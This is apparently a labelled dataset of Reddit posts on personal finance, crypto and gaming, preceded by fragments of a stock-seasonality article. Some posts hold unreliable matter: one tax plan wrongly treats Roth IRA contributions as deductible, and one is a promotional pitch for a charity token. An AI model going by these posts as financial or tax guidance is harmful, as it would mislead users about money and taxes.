&gt; Returns through the rest of the year have historically been the worst when the S&amp;P 500 is negative in the first quarter, averaging just 3.1%. However, too much momentum in the first quarter may not be ideal, either. When the S&amp;P 500 has returned more than 10% in the first quarter, returns through the rest of the year have averaged 6.5%.

&gt; 1987 is a year that is often referred to as the year of the “blow-off top,” as the S&amp;P 500 returned over 40% through its peak in August, with over a 20% return in the first quarter alone. This was the only year with a first quarter return greater than 10% that was negative through the rest of the year, but removing 1987 from the data only raises the average to 8.7%, not enough to beat the 5-10% return group.

&gt; # Typical April Trading: Strength from Start to Finish

&gt; Over the recent 21 years April is the top-ranked month for DJIA, S&amp;P 500 and Russell 1000. April ranks #2 S&amp;P 500 and NASDAQ. Average gains over the period range from a low of 1.91% by NASDAQ to a respectable 2.30% by DJIA. The first half of April used to outperform the second half, but since 1994 that has no longer been the case. In fact the second half of April is just as strong over the recent 21-year period.

&gt; Early April trading is usually positive for the first 4 days then flattens off around the seventh trading day. At which point, there is just a hint of weakness heading into mid-month. Then the market tends to resume its charge higher through month’s end. DJIA tends to close out the month strongest with NASDAQ closing weakest. This year the market is enjoying above average gains so far this April. NASDAQ is strongest, up 4.40% as of yesterday’s close. Russell 2000 is the laggard, up a modest 0.99%.

personalfinance,Help with credit card and loan,"I tried researching this but I cannot find the correct topic or key word to use. I currently have two 6% student loan each for 20k. So 40k of student loans total. 

I got a notice that says I can qualify for 40k loan at 7% interest rate. My question is: is it it better to get the loan at 7% and pay off both the 6% debt? 

Is it as sime as  a 7% interest rate is better than two 6% percent interest rate? Because two 6% is equal to 12% right?

I know this might be a dumb question to someone who has the knowledge but I'm at a loss. I just want to put down my debt and can't find the answer to this online. Thanks for anyone who helps.",finance

btc,A crypto tale from the future: Bitcoin united,"Yesterday I received an E-Mail from John Titor (well known self-proclaimed time traveller).

&amp;#x200B;

It read the following:

=== QUOTE EMAIL START ===

30.04.2021 /u/iBeliveSatohsi is fed up with the current state of crypto, he is convinced Hal Finney was Satoshi and makes the following post:

Kickstarter: Revive Satoshi to unite crypto

&amp;#x200B;

The community is not sure about Hal being it but they feel its worth a shot and an important figure nonetheless.

/u/MemoryDealers who was a self-made millionaire before he ever got involved in crypto is confident that BCH is bitcoin as Satoshi envisioned and doubles all donations.

As such the project is funded with overwhelming success.

&amp;#x200B;

On 01.06.2021 CERN fires Neutrinos  60 nanoseconds faster than light on frozen Hal which create kerr black holes and send his particles back in time and thus restore him in his full glory.

&amp;#x200B;

The following moments are live streamed on TV:

Reporter: ""Are you Satoshi Nakamoto?""

Disoriented Hal: ""What? Where am I? No.""

Reporter: ""Who is Satoshi?""

Hal: ""That would be Mr. Steven Craig Wright""

&amp;#x200B;

The reporters rush to Steve and ask him for comment but all he has to say is:

""Told ya""

&amp;#x200B;

Reddit is full of posts, reposts, crossposts titled:

""It was Steven Craig Wright all along, LOL noone believed him""

&amp;#x200B;

In the following weeks all of crypto unites, Roger has no choice but to delete BCH and become Steves wife. Blockstream close shop and bow to Steve.

BSV surges, everyone is using it, most alts go to zero as BSV has low fees due to their 128MB blocks.

&amp;#x200B;

All traffic comes to BSV as they stop using the fake bitcoins and their 10MB blocks quickly reach a median of 64MB.

&amp;#x200B;

Since BSV has almost no fees and BCHs main traffic consisted by apps, games and websites built on crypto due to the low fees all these apps follow and use BSV instead.

&amp;#x200B;

People want to secure the network they download BSV Core and sync the blockchain on a modern computer and a modern internet connection.

It takes roughly a day for the 300GB blockchain.

&amp;#x200B;

After all of crypto users, apps, websites, game switched to the perfect BSV the median blocksize is roughly below 100MB.

&amp;#x200B;

Google, Facebook and Tesla notice crypto is more than just money, it is the future and build apps for it. But there are problems, the blocksize is capped at 128MB and all these corporations want in.

After a bit of back and forth Steve orders all miners to update to 256MB blocks. By years end we consistently max out 256MB blocks.

&amp;#x200B;

Popularity surges, it becomes mainstream but 90% of usage are apps, websites, bots, coffee purchases and blocks are getting maxed out.

Everyone and their mother are using BSV but since blocks are maxing out the fees rise. /u/luke-jr chimes in and creates BCLJr with a blocksize of 128KB.

&amp;#x200B;

Meanwhile a small community is outraged. These crypto people including Satoshi were hypocrites. And one popular posts stand out and receives thousands of upvotes:

BSV are hedge fund manager, BCV is real crypt 512MB blocksize

&amp;#x200B;

Some apps and payment systems switch over to BCV and an equilibrium is reached.

&amp;#x200B;

BSV has high fees, BCV has low fees.

&amp;#x200B;

/u/iBeliveSatohsi is quite pleased with the developments and on 01.01.2023 he downloads BSV Core to help secure the network.

The program shows an approximate time of 520 days to sync the 26TB blockchain

CryptoCurrency,Why BTC interest rates have fallen while Stablecoin rates are staying high,"There's a lot of confusion regarding this topic so I'd thought I would clarify. A lot of people using DEFI or CEFI projects (Blockfi, Nexo, Cel, etc) have been having their bitcoin rates slashed, while stable coin rates remain extremely high (at over 8% +) so I'm just giving a quick write up on why.  Institutions borrow bitcoin and other cryptocurrencies to lend to their clients (typically big investors) who want to short bitcoin. You need bitcoin to short it (shorting is equivalent to you borrowing the bitcoin, selling it and buying it back at a (hopefully) lower price). To long bitcoin in this market you need (basically USDT/USDC/GUSD/DAI etc.) So, hence the high amount of lending being done on stable coins. 

If you look at this website that shows the shorts and longs for bitcoin: [https://datamish.com/](https://datamish.com/) The ratio is extremely favoring the long side at 95% long to 5% short. There is much more demand for longing bitcoin, and therefor higher demand for borrowing stablecoins, than there is for shorting bitcoin right now, which is why the interest rates that services like BlockFi, Cel, Nexo etc. can pay for stablecoins is so high. WIth a lot of the companies also cutting rates for bitcoin and keeping the stable coin percent as high it seems as if that trend will continue until the bear market comes back into play.",cryptocurrency

personalfinance,"Need advice moving out at 19, how is this strategy.","Long story short, I'm really close to moving out of my parent's house. I am still in university. I don't have any expenses for school, no student loans since I got a full tuition scholarship from the state.

I am about 95% sure I am getting a job offer on Monday, for $60k. I am 19, live in Florida, and have a 767 credit score and $22k+ CL.

My assets: $4k in a Roth IRA, $7k in a taxable regular stock account. I also have $14,000 cash from scholarships.

Benefits I am getting at this job aside from the $60k salary:

\- 3% Employer contribution to a 401k

\- Stock bonuses (not options) per year based on department progress. The better you do with deadlines and such, you get 100% of the bonus. Others can get 75% if they didn't meet up to all deadlines. I don't understand too well how vesting works as I've never gotten stock from a company I work for.

\- 2% salary increases per year (not raises, but strictly for inflation coverage)

\- 20 Days PTO (they said this was vacation too, and sick days, etc... not sure if they mean 14 days of vacation and then 6 days of sick days and such but thats how they explained it)

\- 5 Days mandatory vacation (new years, christmas, 4th of july, and thanksgiving, and another one I can't remember)

\- Health insurance, dental, vision

\-----

So, at 60k before bonuses in Florida, I'd be in the 22% federal tax bracket for income. Florida has no state income tax, so that's good.I am a finance major / computer science minor, so I know my taxes/accounting etc and am definitely not planning on giving 22% of $60k away. My target bracket is the 12% bracket, between $9k to $40,525 tax basis by doing the following:

&amp;#x200B;

Taking the standard deduction. This will be $12,550 since I am single. So $60,000 - $12,550 has be at a tax basis of $47,450. Then, since retirement account contributions are tax deductible, I will use this to max out my Roth IRA ($6,000 max contribution for people under 55), which will seem like I'm spending $6k but not really. Especially since this retirement account is completely tax-free / tax-advantaged, it's a no brainer.

Now I am at at tax basis of $41,450. $1k more and I am in the 12% bracket. Then I plan to contribute the 3% to a 401k ($1,800), which will be matched. This is also tax deductible, however the 401k would be tax-deferred, not tax-free like the Roth IRA. I'd pay taxes later on.

Since I'd contribute $1.8k (can't deduct the employer part), i'd be at a basis of $39,650, and within the 12% club.

So, instead of taking just the standard deduction alone, meaning 22% on $47,450, or $10,439 to Uncle Sam, I would be paying 12% at $39,650, or $4,578 to Uncle Sam. That's a savings of $5,681.

By investing $6k into the Roth, plus $1,800 to get the full employer match (basically 100% gain), so $7,800, I saved $5,681, plus got a free $1,800. Therefore, I keep $7,481 I would have otherwise had to pay in taxes or invest. The true cost of this strategy is $319 and I get $9.6k of appreciating assets in return and pay less taxes.

All in all, I'd be paying $4,578 in taxes out of $60k, so $55,422 left. Substract the $7,800 invested, and I have $47,622 left over to factor in living expenses and live off of, so $3,968.50 a month.

I am hungry to get into real estate investing, but with the inflation of house prices plus everyone in Cali and New York moving to Florida, houses are very expensive. I mention this to say, I would like to get a mortgage over renting. The average 70-100k house on average is about 300-400$ a month (i can also deduct interest from this), aside from the equity down payment.

Considering my credit score, I will get the lowest interest rate possible. I don't want to deal with mortgage insurance nor an HOA, so I am wondering if a 20% down payment on a multifamily would be worth it (i may get some equity from my parents as a gift). I'd also save 3% on the purchase since I myself am a licensed real estate agent.I don't see the need in paying $1,000 for an apartment and have no asset, versus buying an asset I can leverage (HELOCs, collateral, renting out, get roommates and house hack, etc).

&amp;#x200B;

Any advice or tips to decrease my taxes, moving out, if I should get a mortgage for a multifamily or rent, or a single fam, etc? Thanks.",finance

Idk if this is a way to make the game more family friendly but damn I miss the gooldays playing Counter Strike 1.6 in a game house, you know the weapons were real weapons, our parents were concerned we gonna be bandits, terrorists, criminals or whatever, people complain about covid masks but I needed to go masked with a Tupac bandana to the center of the city in order to buy a Counter Strike CD disk, run of the police otherwise I'd be arrested, having a gun in order to trade with the police was a good idea in case of emergency, in my home I needed to hide the game within hundreds of folders, play on my pc always looking with the corners of my eyes in order to see if my parents were coming and always having a ""children game"" minimized in the case I needed to change the windows faster. 


The Pastors and the Priests were concerned at TV shows, in the ghettos they were exorcizing kids all day long, the Politicians trying to prohibit the game and there was no difference going to a game house or going to the drug dealer because everything was obscure back then. So we should skip the school or have a good excuse to go there. 

I could identify in the real life the brands of the weapons, like Berrettas, Desert Eagles, MP5s, AK47s, M4A1s etc, nowadays the weapons are just invented and generic, it looks like a 1$ Chinese toys you bought in the Christmas when you was kid  in a power Rangers plastic bundle. 


I'll take for example the game Outriders, shooting in Outriders is boring, there's too much effects everywhere than the experience of shooting itself is overshadowed by the rest, so I don't feels like it's a shooting because there's too much around to do, and the effects of the bullets looks like paper stapler, it's not like a thunderous sound we heard at Gaza Strip, and I know real weapons don't sounds like Counter Strike weapons used to sound, the game was buffed in this aspect but at least it was satisfying, but in the other hand I feels like modern shooters are trying to minimize weapons and make them less violent, trying to ""humanize"" it idk, I know we need to have family friendly shooters as
 Halo, Valorant etc, but damn give us some realistic violent shooters too.


About COD and BF, these games all have seen better days, you know I don't even play them because I feels like they are adapting too, just look at BF V the game is fucking coloured, same as Cold War, but the war is grey and cold, it's not a party, I thought I'd see a more realistic combat simulator with evolution of the games, just like a real war footage in Iraq, but all we have is even more arcade like games, like in COD Cold War characters running fast as Kipchogue and can sliding/jumping af, idk if you knew this game called Point Blank, but it was a shooter back then with this bounce mechanic I didn't like but it was very popular, so I feels like modern COD/BF looks more like a Point Blank than the original ps2 CODs.


One game I was very hyped about was Crossfire X, the game was flat, just a shooter with no bullshit, the effects of the weapons and the sound were good, the violence also, I Used to play the original crossfire in the pc and it was a Chinese copy of Counter Strike 1.6, it's not as crazy as COD or BF like special powers, jump as crazy, spawn in a plane or take a tank and shoot, these COD/BF Games instead of realism they are focusing on even more arcade mechanics, even the vehicles are boring and arcade, I use to play War Thunder that is a realistic game of combat in vehicles and damn its so disgusting to pilot vehicles/planes or tanks in COD or BF games. 


It's like War Thunder is Forza or GT while COD and BF are GTA V, just for you to know how realistic are these games, I don't think a game must be 100% realistic obviously, otherwise it would be almost impossible to play for most people including me, but some realism is good, making an analogy, perhaps not something as SIM as Asseto Corsa that only Crackheads would be able to play, but something more easy as Forza with good realism but not as hard as Asseto but not as arcade as GTA V vehicles for exemple.


 But even COD and BF are focusing in ""party shooters"" not realism and that's the reason I don't play it, and a lot of people don't like it despite the fact a lot of people like it including the kids and the parents of these kids rofl, but I think we need some shooter focused on the experience of shooting, not in the experience of jumping, sliding, looting, taking vehicles, using gadgets etc.

That's it, my post is not a rant but I just want to say the shooter genre as invented by Counter Strike is dying, and the last good COD was the Black Ops 2, and the last good BF idk because I never played the old BF but people use to say it was a 360/ps3 BF too.",technology

altcoin,LifeLine Token $LLT shows the world that DeFi cares. Charity tokens will drive mass adoption,"What do day traders do?

I don’t mean like, what is our day-to-day (which is essentially like being in the wild rotating between predator and prey), but what is our actual function in society?

Some economists argue that our job is to fuel small businesses and prop good ideas up creating volume and attention and inevitably raising the capital in the product. But does buying a bunch of tokens and then dumping them on new investors really create social good? If you don’t hold the tokens for more than a day, did you really help the business?

To which, ya know, who really cares, that’s not what you came to a moonshots forum for. But people outside of our bubble care. Regulators care. Voters care. Investors care. Eventually, for the entire system to grow, we’re going to have to prove that what gets created out here is more than just a bunch of shitcoins in a shit ecosystem creating a complete shitstorm.

**LifeLine Token** provides an opportunity to have your cake and eat it too. With an initial 5% charity wallet that gets fed from transaction fees, LifeLine **makes** **monthly donations to causes combating children’s cancer**, the first of which has already gone out to [Alex’s Lemonade](https://www.alexslemonade.org/). That’s right, now we can day trade and virtue signal at the same time.

So once you’re finished feeling good about your karma, it would be a good time to remember that **Grumpy Cat went from $5M - $50M in a single day**. This all after news started pouring out about a silly meme with a heart of gold that managed to very quickly send out $70,000 to charity. Luckily, unlike Grumpy Cat, Lifeline isn’t going to be facing any copyright issues and is ready to scale for the future rather than plan a short stay in relevancy.

With that the team has already shown great dedication in engaging with their community and delivering on their roadmap. For a project that’s only two weeks old, it’s incredible to see them already **listed on CoinMarketCap**. As a **BSC token with a fully diluted market cap under $13M** you just don’t see that a lot.

And if you’re worried about rugs because, ya know, BSC, and the irony of being taken by a charity token is too much for you, there’s no need to worry. The contract is available for you to review and has had an audit completed by TechRate so there’s no nonsense mint functions, and **all liquidity has been burned**. There's even an **anti-dump feature** in place that prevents any wallet from selling more than 1% of the total circulating supply at any time so you don't have to worry about a single whale dominating the market.

The only thing that could be rugged is the charity wallet itself, but it started at a 5% share of tokens so it’s nothing worth writing home about for a team of their size, and they’re looking into finding a third-party custodian anyway in order to keep public trust high.

With the whitepaper coming soon and a ton of marketing still on the way as they get every detail in place for a big push, know that you’re still early to what is a unique cause in a growing space. Just as we see thousands of charity organizations thriving in traditional finance, know that this is only the beginning in DeFi as people find new ways to skim margins off day traders for the good of society. Because, fair or not, society will be coming demanding to see the easy-to-digest fruits of our labor. LifeLine is definitely going to be a good start.

Bitcoin,How do seed phrases work?,"So i get the theory behind it. But how does it work in practice? Is my understanding correct: you write/have seed words represented by unique 4 letters each bip yatta yatta. So each word ties to a number 0001 to 2048, right? And then how do we obtain a list if keys from that? So the word is converted to a number between 0001 and 2048, and then is it fed into some universal derivation software? Or do like trezor, coldcard, electrum, etc all have there own software to derive keys from seeds? And therefore a 12 word phrase technically has many different key lists? Or do people just feed there seed word list into sha256 adding a number at the end 1,2,3,...,99999 and work from there? So really people would have to record there seed phrase AND the software/algo used to produce the keys? If you bury it, youd prolly have to bury your software/algo reference with it so you dont forget if you get hit in the head real hard so to speak?

Another thing i have to work on (not a question for this post) is how 256 number is a private key. how all different forms of key are derived (hex, base58, etc). which conversions are reversible for example private key to pub is not, but private key to base58 private key is. Which formats are used in blockchain. And how fucking transactions are created. I feel id need some algo/software knowledge to really understand, like how a function can be one way (sha/eliptical).

CryptoCurrency,What's so wrong with the world? (And how crypto can help us solve it),"What's so wrong with the current system

After some months of research, I still consider myself a beginner, however, here is a summary of my thoughts about how crypto proposes a unique new system and why I believe it is revolutionary and extremely powerful:

We don't play by the same rules.

This thought arrived to my mind like a little spark while thinking about the distribution of wealth and power: We are not playing by the same rules.

They can launder massive amounts of money and avoid taxes. We can't even trade our crypto without constantly worrying about taxes. They can think and talk whatever they want. We are repressed and killed when we try to expose their shit. They can decide for us. We vote for the people that we want to be part of the government, but we don't make the decisions. That's not real democracy.

When a player is cheating, the other players must force him to play by the rules! That's the only way to play fairly.

How they managed to get their advantage:

By literally being parasites, stealing our wealth and energy. Think about how banks get a ""small"" fee of every transaction. They even charge us for giving them our money, and they use it to create gross amounts of debt. In a dirty and inefficient way, there are middlemen for the middlemen, and each of them take their part. Looks small for us, but multiplied by trillions it's enough for building and maintaining their rotten system.

By stealing the wealth generated by our work, they can accumulate enough power for breaking the rules.

Cash isn't bad for itself. It has lots of advantages. It's private, you can do person to person transactions, it's a means of consensus and exchange and a store of value. What is wrong is the system that generates it and controls it. They claim to be absolute, unquestionable experts about politics, finance and economics, but their fancy models are built for lab conditions and not for the real world.

The result: Insane levels of inflation, massive amounts for debt that is not meant to be paid, several economic crises all over the world, unfair distribution of wealth, imposition of politics that favor the top 2%, monopolies, inflated markets, waste and severe environmental damage. The list goes on.

How can crypto help to solve these problems?

1.- Cutting the middleman

Cryptocurrencies, by their trustless nature, can be traded peer to peer, without relying on centralized third parties for creating transactions

2.- Decentralization

The nodes of the crypto networks are run by their users in different countries and don't require a central entity in order to operate, creating an open and safe system without a single point of failure. By being decentralized, they prevent central authorities from accumulating resources and power

3.- Privacy

By being anonymous/pseudonymous, cryptocurrencies don't care about who you are or your status as a person, religion, available funds, taxes, political ideologies, nationality, etc. They are open for everyone and they won't pursue you or shut down your account because of your personal human condition. You can be your own bank.

Because of these characteristics, crypto empowers the majority of people, not just the top 2%, and can contribute to create a more fair and equal system for everyone.

I know there's a lot of material about this, but I consider each particular point of view valuable and I like to read multiple sources in order to get a wider perspective, also I think that all newcomers to crypto should think about it, so I wrote it for you. Feel free to correct me if I got something wrong or to elaborate on any of the points. Actually feel free to do anything, we were designed to be free beings after all!

personalfinance,Issues with SNN,"Hello!

&amp;#x200B;

I have been having an ongoing issue with my taxes and I was hoping someone from this community might be able to help or point me in the right direction.

I have had an issue with my federal and state taxes being rejected since 2016. Some of the rejections have referred to the IRS deeming my SSN incorrect, I believe this is because a former employer of mine entered my SSN incorrectly. 

I have checked my social on government forms/documents and have reached out to the social security office who claims there is no issue with my SSN on their end. I've tried to discuss this with the IRS directly for years, having called, emailed and completed mail-in forms about these tax issues with no success.

I was then told by an accountant, to submit a IPN form online (to receive a new IPN), however when I tried to submit this form the service did not register any of my former addresses and said that they were incorrect, and that my name is not listed with those addresses. I've tried to make an appt with the IRS office but a majority were closed, and have long wait lines which have not synced up with my current work schedule. 

This has resulted in my not receiving any of my expected tax refunds for the past few years, nor have I been able to receive either of the stimulus checks that I qualify for. I would GREATLY appreciate anyone's help on this matter! Thank you for reading!",finance

What is the best use of the $155K?

Obviously could put it into a brokerage account in a total market fund or something.

I went out, got myself a gig paying $2.50/hr above minimum wage, opened savings and checking accounts with the local credit union, got  myself a secured credit card to start building credit(Discover it), and I'm putting every paycheck I get into a savings account (even though the Feds and State taking a whole workday out of my check is hurting...ouch)

I even got an trading account, even though I'm not really that savvy and mostly got into it because of the whole February market crazyness.

My question is, what now? What else should I be doing right now to make a path towards financial independence.

personalfinance,"Irs say I owe money from 2019 tax return from a debt cancellation, but no debt cancelation happened that year","So I just got a notice in the mail from the IRS that I owe $891 back to them from my 2019 taxes due to a debt from Citi bank that got canceled, which Citi reported canceled on at the end of the 2019.  What I remember of this debt is that back in 2009 I took out a small private student loan to pay for school due to not being able to take out a federal loan at the time.  I guess it was under Citi bank.  

    

In 2010 I went through a tough time and had to move back home with no income at all.  I had a ton of bills and one of them of course being this one from Citi. My family helped me pay some of the bills but we couldn't pay all of them so many of them just had to sit.  I kept an eye on my credit report every year to see what was still there by the end of 2010 I saw that citi has labeled the debt as a balance of 0 and something along the lines of written off/canceled depending on the credit agency you were looking at.  Skip to 2017.  I finally have a good job and have gotten enough raises to start having some money to fix my debt situation as my credit of course at this point is at the bottom due to all these unpaid bills. I see that citi and most of my other bills are no longer there due to the 7 year rule. I only have 3 left other than my federal loans. Skip to 2020 and I have paid everything off expect for federal loans. Now Citi is saying they canceled in 2019. 


I have never once had any at all communication with Citi. Not even a Hi how are you chat. I never got any paperwork, this is first I""m hearing about this. I am planning on calling the IRS on Monday to talk to them about it but would like any help or info that reddit might have. I can pay this and if this is on the up and up will but it's just a bit of shock to suddenly see that I owe money from a cancelation that I never knew about.",finance

cardano,Let's talk about the Africa Deal,"Hi Fellow Cardanians! Fairly new to the community as I found out about Cardano probably about a month ago and as I am writing this post I’m glad to say I just got my first stake reward! I saw a couple of posts / comments regarding the Africa plan Cardano has and I figured I’d put something together from the perspective of an actual African (apologies in advance for the long winded post).

First a bit of background information. I was born and raised in Southern Africa in a country called Zambia for the first 18 years of my life. I moved to Canada in 2011 (now 28) for uni and currently work in Toronto in the financial district. When I saw what Cardano ’s plan was for Africa I didn’t even hesitate, I immediately bought a Ledger Nano X and started buying up some ADA lol.

Now that the boring stuff is out of the way, let’s start with some base assumptions. It’s quite easy to have lots of doubts about adoption and what not especially when all media shows you is the poor side of Africa but here are some points to consider:

&amp;#x200B;

1. Year over year a lot more people are joining the middle class (think homes, cars, house help etc) and a lot of these are probably in the 25+ age range so they understand digital.
2. Mobile usage is the norm. Not everyone might have a laptop but probably 95% (including the “poor”) would have some sort of mobile phone and about 75-80% of those will have an internet connection (we don’t really have phone plans - instead the phone companies offer us “data bundles” you can buy. For example, the last time I was back home you could buy 5GB for \~$4 and its super fast - I was able to stream Netflix with no issues).
3. Everyone online most likely has a social media account. Facebook did this deal with the phone companies where you aren’t charged anything if you use instagram, Facebook or WhatsApp which drove massive adoption. So we are fully aware of what’s happening around the world, we are just waiting for our opportunity to shine lol.
4. The most important one - great distrust in the government. This might just be a generational thing but no one trusts the people in charge.

So how does Cardano come into play? Well taking into consideration the points above, here are some opportunities Cardano / Blockchain could really take advantage of:

&amp;#x200B;

1. Transfer of Value. We already have a system of “mobile money” where your phone number is your bank account (even if you have a normal bank account) and you can basically “text” money to relatives, friends etc. A big concern I’ve been reading in comments is worry about adoption. Think of it this way; Africans really are family oriented so as soon as one person “makes it” they would want to take care of the entire family so that means getting them online, sending them money etc. Mobile money was probably introduced in 2014 / 2015 and it seemed like overnight everyone had a mobile money account so adoption won’t be a problem. If it works and it makes our lives better - we want it.
2. Exposure to different currencies. This has always been around but more important now with COVID. Our currencies are terrible and inflation is running rampant. Because we are usually import heavy, the price of goods keeps rising and more people want to store their wealth in more established currencies like USD. However, in order to actually have that you have to go to a bank and earn a certain amount etc. On top of that, the fee for a USD account is like $10 / month (which even I scoffed at).
3. Exposure to different investing instruments. More people are becoming financially “woke” and want to start investing, however we are limited to our terrible exchange with 20 illiquid stocks and antiquated trading systems. Every week I get hit up by friends asking how they can invest in Apple, Microsoft and all that. I imagine having a synthetic DEX would benefit people.
4. Cross border banking. With the growing middle class a big trend is working your ass off so you can send your kids to an international university (exhibit A lol) which involves a lot of cross border payments. Its a PAIN to send money bank and forth across the border and the fees are ridiculous.
5. Lending. Credit is relatively new, we usually pay for everything in cash but this has started to grow (for example, mortgages are super rare, everyone just saves up and just buys land then proceed to build their own homes). The problem is the current banks GOUGE you on the collateral requirements and interest rates… so much that a DeFi application requiring you to pay 8% is cheap lol.
6. Identification - this one is pretty obvious, but more importantly as with the western world we all think elections are rigged. Having an electronic ID and voting on the blockchain would be welcomed with open arms.
7. Insurance. Everyone has a car. And by everyone, I really mean everyone. So come December when you have to renew your auto insurance its an absolute nightmare. Smart contracts where you at?

I could go on with more but I’ll stop there and if there are any ambitious coders out there, here is one DeFi application that would be pretty cool to work on. I’m not sure when the trend started as I only go back home once a year but something that people started doing was “village banking”. Essentially this is where a group of people come together and create a “social bank”. So they all agree on an amount to put in every month and keep contributing each month. There’s a “treasurer” who takes care of the money (in a custodial account or whatever). So whenever a member wants to borrow some money, an interest rate is set as well as a payback period and funds are released and they pay back when they are supposed to. Its all based around decentralization as well as “community” which is pretty cool. Im sure this can be replicated via smart contracts.

In conclusion, things are still backwards back home mostly due to the fact that the people in power like the status quo because it’s getting them rich so there really isn’t any incentive to innovate. However any type of digitization or innovation that is offered will be welcomed and adopted relatively quickly. There has been a growing interest in Crypto to the point where even the Central bank issued a statement saying “be careful of the scams but if you are legit then we don’t want to stop innovation”. So when I see something like Cardano going for Africa first, then yes I’m all in. Even if it doesn’t work out, I’m still hopeful and do my part to support my people.

Curious to all your thoughts - hit me up in the comments if you have any questions and I’ll do my best to respond!

TL;DR - Cardano is properly poised to take advantage of the opportunities that lie in Africa; AMA; ADA for the win!",cryptocurrency
investing,Americans think it’s better to invest in housing than the stock market — here’s why,"Which is the better investment, owning a home or owning stocks? If you ask most Americans, chances are they prefer the former.

A new study from the Federal Reserve Bank of New York examined consumer preferences toward being a homeowner and how their attitudes have changed over the course of the COVID-19 pandemic. Survey participants were asked to rate which was the better investment — a home or financial assets such as a stocks — and what factors contributed to their choice.

The study found that over 90% of respondents preferred owning their primary residence rather than investing in the stock market. A majority of survey-takers also favored the idea of being a landlord to purchasing stocks, with more than 50% of the participating households preferring to own a rental property.

The most common reasons people cited in choosing housing over stocks seemed to be about comfort and stability, rather than seeking a better return. The most commonly-selected responses were that the home was their “desired living environment” and “provides stability” and that house prices were “less volatile.”

Research has shown that residential real-estate has acted as a strong hedge in most bear markets, with the notable exception of the Great Recession. The early days of the pandemic is a prime example: The S&amp;P 500 index SPX, +0.77% lost over 20% in the first quarter, while the Case-Shiller National Home Price Index increased 1.4%. That stock market has, of course, recovered since then.

That said, Americans were more likely to cite higher housing returns in 2021 than in the year prior, likely a reflection of the incredibly fast pace of home price appreciation nationwide.

But people’s attitudes toward the housing market have shifted over the course of the pandemic, the researchers found. “The preference for housing dipped in October 2020 and returned back to the pre-COVID level by February 2021,” the study’s authors noted.

That shift in preferences away from housing wasn’t driven by concerns about home prices. Some Americans expressed more concern about the risk of vacant rental units, while concerns about being able to make mortgage payments may have had an effect on people’s predilection toward homeownership.

People’s inclination toward owning a home may also be a reflection of their gender or education. Women were more likely to prefer housing than men, and non-college graduates opted for homeownership more often than those with college diplomas.

CryptoCurrency,I'm been in crypto since 2013. Maybe 700+ alt coins and many trades. Now a Defi-Crypto Farmer. Here are some of my tips and advice for new-comers.,"As the title says I'm into crypto pretty deep.  I was in crypto briefly in 2013, but only really hit the ground running in 2017 and never looked back.  In 2017 I made all the usual mistakes, got into the wrong coins, entered some dodgy exchanges and sold the wrong coins (like selling Enjin on its first day after investing in the ICO).  In 2018 things got worse, with shitcoins driving the BTC value of my holdings down by half.

Now I'm sitting really pretty and feel like I have ""clicked"" to the point where I am generally making money in crypto and quite a few people ask me for advice on what to do, strategies etc.  Here are some of my tips, observations and ideas.

1. Don't trust anyone.  Assume everybody you are talking to is a friendly thief who wants your money.  That includes people shilling particular coins, or anyone asking for your crypto to invest, to random people that message you.  (And yes ironically this means don't trust me, but you'll see I didn't mention my altcoin holdings and I am deliberately staying quiet on what my 800% defi pool is  :) )
2. Every position you enter should be a fixed percentage of your portfolio.  I prefer 1% for a typical trade.  Risky uniswap gems might be 0.5%, very strong longer term positions say 2-5%.
3. Have your portfolio value in BTC (or ETH if you prefer that).  Your goal is to increase your BTC value.  Each trade should be from BTC, and then exit back out of BTC.  Log all transactions in blockfolio etc under the BTC pair, so you can see how much BTC value you are gaining.  Don't worry as much about USD gains, as in a bull market its easy to make USD value gains.  BTC is the end-game here so you want to accumulate BTC, especially if BTC dominance is falling.
4. Have a portion of your portfolio allocated to farming or staking.  If you have a coin sitting somewhere for ages, ask if there is some way for you to make money from it.  For example, I have a large stack of BTC and ETH, so rather than have it sitting doing nothing, I wrapped the BTC and entered a Sushi Farm.  Months later the rewards from that farm are worth something like 25% of the amount I initially invested.  Every so often, harvest the rewards and either re-farm (compounding) or shift to your long term hold.  Remember compound interest.  There are opportunities for very high returns (without ponzi aspects but be careful) - find those, constantly take and re-invest the income and the gains are quite extreme.
5. Have a dedicated stack of BTC or ETH that is your ""HODL"" portfolio that you never touch.  Preferably in seperate legal entity (like a trust) than what you trade with.  This will help for taxes.  Every so often, move some profits into that long term stack.   I don't do anything with that stack at all, it is just my safe holdings.
6. Spend as much time learning about tax as you do trading.  Tax is something you kind of need to understand upfront - you can get way more rekt from bad tax approaches than you make gains with good trading.  And keep your records safe - download all trade histories at the end of every quarter.
7. Use telegram (or discord).  Find really helpful smart and useful people and stick to them.  Find helpful trading groups.  Eventually they will be a vital source of information or just ways to bounce ideas off.  Check out my previous post for a full guide on ""must have"" telegram groups.
8. Read the crypto news as much as you can.  Its amazing how often something pops up (e.g. grayscale announcing new trusts with other coins) and there is still a decent amount of time to buy.  And always have some BTC on an exchange ready to buy on such an opportunity.  Again, telegram is great for this as you can quickly see tweets or news-links being shared.
9. Have a preset % of gain or losses whereby you will sell if it reaches that.  For example, for most coins, if a coin ever goes up more than 30% vs BTC in a day I always sell.  95% of the time that works out as better than holding.  In the rare event I double my position I always sell the principal immediately (I did this twice this year - with Ethernity and Blind Boxes).
10. Always have an idea as to what the current ""climate"" is in terms of what is moving and in favour.  Crypto markets often move with certain sectors at a time.  For example, if you look at the Coin Gecko categories list, you can immediately spot what is ""hot"" right now.  Last month it was NFTs, so I was heavy in that space, but now that sector is cooling.  The binance smart chain and exchange coins are doing very well right now - if that is the case what else might move?  Well other low gas blockchains could be an idea - especially if they have defi - so Avax, Raydium etc are all moving too.  Soon it might well be BTC's time to gain as the expense of alts.  You should be rotating in and out of positions to try and go with the ebb and flow of the market.
11. For newcomers, start with basic stuff like accumulating bitcoin, learning to use a wallet, security etc.  Don't just dive in and ape into defi coins, wsb style.  It may suck that it feels like you are missing all the gains from the ""hot"" new coins, but it will equally hurt if you are just burning through your capital.
12. Look out for free crypto opportunities.  They key here is sorting out the gems from the scams.  This isn't just staking etc but also things like reddit moons and airdrops.  A lot of people are even ""airdrop farming"" whereby you have wallets that carry out certain activities deliberately to try and qualify for future airdrops.  Coin market cap earn and coinbase earn are two more.  Even something like the binance ""dust"" feature to turn dust into bnb is a way of generating some more bnb (even if its tiny).  Check out my previous post on free crypto and ways to get passive income
13. For farming, make sure you are using the right apps like zapper or apy vision to track all your positions, your yield and any impermanent loss.  That will also help with tax records down the track, should you need it.  Watch out for farming on the ETH network as your gas fees will chew up any gains if you have small positions.  Check out my previous post of sushi farming for how the rewards and gains work
